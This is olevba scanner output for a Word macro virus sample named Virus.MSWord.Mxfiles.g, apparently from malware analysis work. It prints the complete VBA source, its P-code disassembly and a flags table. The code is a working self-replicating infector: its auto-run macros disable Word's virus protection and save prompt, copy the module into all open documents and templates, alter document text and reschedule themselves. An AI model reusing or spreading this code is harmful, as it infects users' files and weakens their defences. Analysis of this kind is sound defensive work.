olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO abc.bas 
in file: Virus.MSWord.Mxfiles.g - OLE stream: 'Macros/VBA/abc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
mxf
End Sub
Sub filetemplates()
mxf
End Sub
Sub Autoexit()
mxf
End Sub
Sub Autoexec()
mxf
End Sub
Sub Autonew()
mxf
End Sub
Sub Autoopen()
mxf
End Sub
Sub Autoclose()
mxf
End Sub
Sub Openshell()
mxf
End Sub
Sub viewvbcode()
mxf
End Sub
Sub mxf()
On Error Resume Next
Dim counts As Integer
Dim stri As String
Dim docpath As String
Dim dayn As Integer
Dim monthn As Integer
Dim org As String
Dim dest As String
Dim reg As String
Dim dur As String
Dim min As String
Dim kind As Variant
Dim namem As String
Dim strin As String
Randomize Timer
namem = "abc"
strin = "بسم الله الرحمن الرحيم"
Application.UserName = "Sosta"
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
org = ThisDocument.FullName
For counts = 1 To Documents.Count
DoEvents
If Documents.Item(counts).Path <> "" Then
dest = Documents.Item(counts).FullName
Else
dest = Documents.Item(counts).Name
End If
Application.OrganizerDelete Source:=dest, Name:="mxfile", Object:=wdOrganizerObjectProjectItems
If org <> dest Then
Application.OrganizerCopy Source:=org, Destination:=dest, Name:=namem, Object:=wdOrganizerObjectProjectItems
End If
docpath = Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\" + Documents.Item(counts).AttachedTemplate
DoEvents
SetAttr docpath, vbNormal
Application.OrganizerDelete Source:=docpath, Name:="mxfile", Object:=wdOrganizerObjectProjectItems
If org <> docpath Then
Application.OrganizerCopy Source:=org, Destination:=docpath, Name:=namem, Object:=wdOrganizerObjectProjectItems
End If
Next counts
stri = GetSetting(appname:="Microsoft", Section:="Office", Key:=namem)
dayn = Format(Date, "dd")
monthn = Format(Date, "mm")
reg = dayn Mod monthn
If reg = 0 And dayn > 10 And Val(stri) <> 1669 Then
Selection.WholeStory
If InStr(Selection, strin) = 0 Then
Selection.HomeKey Unit:=wdStory
Selection.TypeText Text:=strin
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.TypeParagraph
End If
Selection.WholeStory
kind = Selection.Font.Animation
min = LTrim(Str$(Int((6 * Rnd) + 1)))
Select Case kind
Case wdAnimationNone:
Selection.Font.Animation = min
dur = "00:00:30"
Case Else
Selection.Font.Animation = wdAnimationNone
dur = "00:0" + min
End Select
Selection.MoveUp Unit:=wdLine, Count:=1
ActiveDocument.UndoClear
Application.ScreenUpdating = True
End If
If dur = "" Then dur = "00:10"
Application.ScreenUpdating = True
Application.OnTime When:=Now + TimeValue(dur), Name:="mxf"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mxfiles.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 906 bytes
' Macros/VBA/abc - 5718 bytes
' Line #0:
' 	FuncDefn (Sub toolsmacro())
' Line #1:
' 	ArgsCall mxf 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub filetemplates())
' Line #4:
' 	ArgsCall mxf 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub Autoexit())
' Line #7:
' 	ArgsCall mxf 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub Autoexec())
' Line #10:
' 	ArgsCall mxf 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub Autonew())
' Line #13:
' 	ArgsCall mxf 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub Autoopen())
' Line #16:
' 	ArgsCall mxf 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub Autoclose())
' Line #19:
' 	ArgsCall mxf 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub Openshell())
' Line #22:
' 	ArgsCall mxf 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub viewvbcode())
' Line #25:
' 	ArgsCall mxf 0x0000 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub mxf())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	Dim 
' 	VarDefn counts (As Integer)
' Line #30:
' 	Dim 
' 	VarDefn stri (As String)
' Line #31:
' 	Dim 
' 	VarDefn docpath (As String)
' Line #32:
' 	Dim 
' 	VarDefn dayn (As Integer)
' Line #33:
' 	Dim 
' 	VarDefn monthn (As Integer)
' Line #34:
' 	Dim 
' 	VarDefn org (As String)
' Line #35:
' 	Dim 
' 	VarDefn dest (As String)
' Line #36:
' 	Dim 
' 	VarDefn reg (As String)
' Line #37:
' 	Dim 
' 	VarDefn dur (As String)
' Line #38:
' 	Dim 
' 	VarDefn min (As String)
' Line #39:
' 	Dim 
' 	VarDefn kind (As Variant)
' Line #40:
' 	Dim 
' 	VarDefn namem (As String)
' Line #41:
' 	Dim 
' 	VarDefn strin (As String)
' Line #42:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #43:
' 	LitStr 0x0003 "abc"
' 	St namem 
' Line #44:
' 	LitStr 0x0016 "بسم الله الرحمن الرحيم"
' 	St strin 
' Line #45:
' 	LitStr 0x0005 "Sosta"
' 	Ld Application 
' 	MemSt UserName 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #47:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #49:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #50:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	St org 
' Line #51:
' 	StartForVariable 
' 	Ld counts 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #52:
' 	ArgsCall DoEvents 0x0000 
' Line #53:
' 	Ld counts 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #54:
' 	Ld counts 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	St dest 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	Ld counts 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St dest 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld dest 
' 	ParamNamed Source 
' 	LitStr 0x0006 "mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #59:
' 	Ld org 
' 	Ld dest 
' 	Ne 
' 	IfBlock 
' Line #60:
' 	Ld org 
' 	ParamNamed Source 
' 	Ld dest 
' 	ParamNamed Destination 
' 	Ld namem 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld counts 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd AttachedTemplate 
' 	Add 
' 	St docpath 
' Line #63:
' 	ArgsCall DoEvents 0x0000 
' Line #64:
' 	Ld docpath 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #65:
' 	Ld docpath 
' 	ParamNamed Source 
' 	LitStr 0x0006 "mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #66:
' 	Ld org 
' 	Ld docpath 
' 	Ne 
' 	IfBlock 
' Line #67:
' 	Ld org 
' 	ParamNamed Source 
' 	Ld docpath 
' 	ParamNamed Destination 
' 	Ld namem 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	StartForVariable 
' 	Ld counts 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	LitStr 0x0009 "Microsoft"
' 	ParamNamed appname 
' 	LitStr 0x0006 "Office"
' 	ParamNamed Section 
' 	Ld namem 
' 	ParamNamed Key 
' 	ArgsLd GetSetting 0x0003 
' 	St stri 
' Line #71:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St dayn 
' Line #72:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St monthn 
' Line #73:
' 	Ld dayn 
' 	Ld monthn 
' 	Mod 
' 	St reg 
' Line #74:
' 	Ld reg 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld dayn 
' 	LitDI2 0x000A 
' 	Gt 
' 	And 
' 	Ld stri 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0685 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #75:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #76:
' 	Ld Selection 
' 	Ld strin 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #77:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #78:
' 	Ld strin 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #79:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #80:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #83:
' 	Ld Selection 
' 	MemLd Font 
' 	MemLd Animation 
' 	St kind 
' Line #84:
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	ArgsLd LTrim 0x0001 
' 	St min 
' Line #85:
' 	Ld kind 
' 	SelectCase 
' Line #86:
' 	Ld wdAnimationNone 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #87:
' 	Ld min 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Animation 
' Line #88:
' 	LitStr 0x0008 "00:00:30"
' 	St dur 
' Line #89:
' 	CaseElse 
' Line #90:
' 	Ld wdAnimationNone 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Animation 
' Line #91:
' 	LitStr 0x0004 "00:0"
' 	Ld min 
' 	Add 
' 	St dur 
' Line #92:
' 	EndSelect 
' Line #93:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveUp 0x0002 
' Line #94:
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #95:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Ld dur 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "00:10"
' 	St dur 
' 	EndIf 
' Line #98:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #99:
' 	Ld Now 
' 	Ld dur 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0003 "mxf"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #100:
' 	EndSub 
' Line #101:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

